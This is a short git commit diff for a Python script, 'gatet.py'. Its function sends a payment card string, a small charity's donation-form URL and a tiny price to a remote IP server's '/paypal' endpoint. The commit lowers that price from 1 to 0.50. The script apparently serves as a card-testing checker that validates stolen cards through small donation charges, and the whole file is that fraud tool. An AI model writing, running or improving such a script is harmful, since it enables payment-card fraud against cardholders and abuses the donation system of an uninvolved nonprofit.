9c5e206d6d7c26ba0fa83f3f0103a83e2f6eb425
maxcdavid77-max <maxcdavid77@gmail.com>
2026-03-10 01:32:28 -0400

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -2,6 +2,6 @@ import requests
 def chkk(ccx):
 	cc=ccx.strip()
 	urll="https://www.northidahowaterpolo.org/donations/donation-form/"
-	price="1"
+	price="0.50"
 	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
